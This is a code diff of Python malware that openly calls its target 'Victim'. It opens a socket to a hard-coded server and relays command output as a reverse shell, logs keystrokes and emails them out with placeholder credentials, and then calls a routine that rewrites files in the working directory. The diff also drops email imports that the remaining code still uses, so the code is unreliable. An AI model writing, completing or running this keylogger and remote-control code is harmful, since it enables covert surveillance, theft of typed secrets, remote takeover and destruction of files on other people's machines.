@@ -1,16 +1,10 @@
 import smtplib
 import os
-import getpass
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import keyboard
 import socket
 import time
 import psutil
 import subprocess
-import ast
+import keyboard
 import winreg
 
 class EmailSender:
@@ -20,11 +14,11 @@ class EmailSender:
         self.username = username
         self.password = password
 
-    def send_email_with_attachment(self, subject, message, attachment_path, recipients):
+    def send_email_with_attachment(self, subject, message, attachment_path):
         # Create a multipart message
         msg = MIMEMultipart()
         msg['From'] = self.username
-        msg['To'] = ", ".join(recipients)
+        msg['To'] = self.username  # Send the email to yourself
         msg['Subject'] = subject
 
         # Add message body
@@ -49,12 +43,10 @@ class EmailSender:
             print("Failed to send email. Error:", str(e))
 
 class Victim:
-    def __init__(self, server_ip, server_port, email_address, password):
+    def __init__(self, server_ip, server_port):
         self.server_ip = server_ip
         self.server_port = server_port
         self.client = None
-        self.email_address = email_address
-        self.password = password
 
     def connect_to_server(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -92,20 +84,15 @@ class Victim:
                     self.client.send(output + output_error)
 
     def send_email_with_keystrokes(self, keystrokes):
-        if not self.email_address or not self.password:
-            print("Please set the email address and password before sending the email.")
-            return
-
         smtp_server, smtp_port = self.get_smtp_server_info()
 
-        email_sender = EmailSender(smtp_server, smtp_port, self.email_address, self.password)
+        email_sender = EmailSender(smtp_server, smtp_port, "your_email@example.com", "your_password")
 
         subject = 'Keystroke Log'
         message = f'Keystrokes captured: {keystrokes}'
         attachment_path = os.path.abspath(__file__)  # Attach the current script file
-        recipients = [self.email_address]
 
-        email_sender.send_email_with_attachment(subject, message, attachment_path, recipients)
+        email_sender.send_email_with_attachment(subject, message, attachment_path)
 
     def start_recording(self):
         recorded_keystrokes = []
@@ -211,20 +198,13 @@ def receive_command():
     return command
 
 def main():
-    # Get the current directory where the program is located
-    current_directory = os.path.dirname(os.path.abspath(__file__))
+    server_ip = "192.168.0.100"
+    server_port = 12345
 
-    while True:
-        user_command = receive_command()
+    victim = Victim(server_ip, server_port)
+    victim.connect_to_server()
+    victim.online_interaction()
 
-        if user_command.strip() == "Obliterate":
-            subprocess.Popen(["python", __file__])
-        elif user_command.strip() == "Exit":
-            break
-        else:
-            print("Invalid command.")
-
-    rewrite_files_in_directory(current_directory)
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
+    rewrite_files_in_directory(os.getcwd())
